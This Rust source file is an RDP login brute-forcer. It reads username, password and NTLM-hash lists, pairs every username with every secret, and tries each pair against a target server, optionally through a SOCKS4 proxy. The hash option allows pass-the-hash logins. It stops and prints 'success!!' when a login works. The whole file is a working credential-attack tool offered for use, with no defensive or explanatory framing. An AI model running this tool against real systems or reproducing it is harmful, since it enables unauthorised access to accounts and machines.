use clap::Parser;
use rdp::core::client::Connector;
use socks::Socks4Stream;
use socks::TargetAddr;
use std::{
    net::{SocketAddr, TcpStream},
    path::PathBuf,
};

// ref: https://users.rust-lang.org/t/hex-string-to-vec-u8/51903
fn hex_to_bytes(s: &str) -> Option<Vec<u8>> {
  if s.len() % 2 == 0 {
      (0..s.len())
          .step_by(2)
          .map(|i| s.get(i..i + 2)
                    .and_then(|sub| u8::from_str_radix(sub, 16).ok()))
          .collect()
  } else {
      None
  }
}

#[derive(Debug, Clone)]
enum Credential {
  Hash(Vec<u8>),
  Password(String)
}

impl std::fmt::Display for Credential {
  fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
    match self {
      Credential::Hash(hash) => {
        // ref: https://stackoverflow.com/a/62758411
        write!(f, "[nlm: {:02x?}]", hash.iter().map(|x| format!("{:02x}", x)).collect::<String>())
      },
      Credential::Password(password) => {
        write!(f, "[pass: '{}']", password)
      }
    }
  }
}
#[derive(Debug, Clone)]
struct CredentialSet {
    username: String,
    secret: Credential
}

#[derive(Debug, Clone, Parser)]
struct ProgramOptions {
    #[arg(long, help="Windows logon domain. Optional, default is 'domain'")]
    logon_domain: Option<String>,

    #[arg(long, help="A target IP:PORT pair")]
    target: SocketAddr,

    #[arg(long, help="A proxy IP:PORT pair")]
    proxy: Option<SocketAddr>,

    #[arg(long, help="A file path on disk to use for a password source")]
    password_list: Option<PathBuf>,

    #[arg(long, help="A file on disk that contains hex-formatted NTLM hashes to connect with")]
    hash_list: Option<PathBuf>,

    #[arg(long, help="A file on disk as a username source (if not used, specify --username)")]
    username_list: Option<PathBuf>,

    #[arg(long, help="A specific username to try (if not used, specify --username-list")]
    username: Option<String>,
}

impl std::fmt::Display for CredentialSet {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "<user: {}, secret: {}>", &self.username, &self.secret)
    }
}

// Helper to create wordlists from a file.
impl CredentialSet {
    fn combos_with_username_and_wordlists(
        username: Option<&String>,
        username_list: Option<&std::path::PathBuf>,
        wordlist: Option<&std::path::PathBuf>,
        hashlist: Option<&std::path::PathBuf>,
    ) -> Result<Vec<CredentialSet>, Box<dyn std::error::Error>> {
        let mut credentials = vec![];

        let mut out = vec![];

        // set passwords
        if let Some(wordlist) = wordlist {
          credentials.extend(std::fs::read_to_string(wordlist)?
            .split("\n")
            .map(|v| Credential::Password(v.trim().to_string()))
            .collect::<Vec<Credential>>());
        }

        if let Some(hashlist) = hashlist {
          credentials.extend(std::fs::read_to_string(hashlist)?
            .split("\n")
            .map(|v| Credential::Hash(hex_to_bytes(&v.trim().to_lowercase()).expect("all hashes to to be hex-formatted NTLM Hashes")))
            .collect::<Vec<Credential>>());
        }

        // add passwords from list to one username
        if let Some(username) = username {
            // add username/pass combos
            for credential in &credentials {
                out.push(CredentialSet {
                    username: username.into(),
                    secret: credential.clone()
                });
            }
        }

        // if has username list, add combos O((n*m)^2)
        if let Some(username_list) = username_list {
            let usernames = std::fs::read_to_string(username_list)?
                .split("\n")
                .map(|v| v.trim().to_string())
                .collect::<Vec<String>>();

            // add each pair
            for username in &usernames {
                for credential in &credentials {
                    out.push(CredentialSet {
                        username: username.into(),
                        secret: credential.clone()
                    });
                }
            }
        }

        Ok(out)
    }
}

/// Try a password combo.
/// Returns true if successful, false otherwise.
fn try_combo(
    connection: &ProgramOptions,
    combo: &CredentialSet,
) -> Result<(), rdp::model::error::Error> {
    let tcp = match connection.proxy {
        Some(proxy_addr) => {
            let socks_tcp = Socks4Stream::connect(
                TargetAddr::Ip(proxy_addr),
                TargetAddr::Ip(connection.target),
                "",
            )
            .unwrap();

            socks_tcp.into_inner()
        }
        None => TcpStream::connect(connection.target).expect("target ip to connect successfully"),
    };

    // make a session connector
    let mut connector = match &combo.secret {
      Credential::Password(password) => {
        Connector::new().screen(800, 600).credentials(
          connection.logon_domain.clone().unwrap_or("domain".into()),
          combo.username.clone(),
          password.clone(),
        )
      },
      Credential::Hash(ntlm_hash) => {
        let connector = Connector::new().screen(800, 600).credentials(
            connection.logon_domain.clone().unwrap_or("domain".into()),
            combo.username.clone(),
            "".into(),
        );

        connector.set_password_hash(ntlm_hash.to_vec())
      }
    };

    // connect
    match connector.connect(tcp) {
        Ok(mut client) => {
            client.shutdown().unwrap();
            Ok(())
        }
        Err(e) => return Err(e),
    }
}

fn main() {
    let opts = ProgramOptions::parse();

    println!("connecting using options: {:?}", opts);

    // ensure we have one source of usernames
    if opts.username.is_none() && opts.username_list.is_none() {
        panic!("please pass --username or --username-list in order to set user to scan.");
        std::process::exit(1);
    }

    // make a wordlist
    let to_try = CredentialSet::combos_with_username_and_wordlists(
        opts.username.as_ref(),
        opts.username_list.as_ref(),
        opts.password_list.as_ref(),
        opts.hash_list.as_ref()
    )
    .expect("wordlist to load successfully");

    // print info
    println!("got {} credential pairs to try.", to_try.len());
    if to_try.len() == 0 {
        panic!("critical: no entries in credential list")
    }

    // try each combo and print status
    for (i, combo) in to_try.iter().enumerate() {
        print!("#{}: try: {} -> ", i, combo);
        match try_combo(&opts, &combo) {
            Ok(_) => {
                println!("success!!");
                break;
            }
            Err(e) => {
                println!("fail {:?}", e)
            }
        }
    }
}
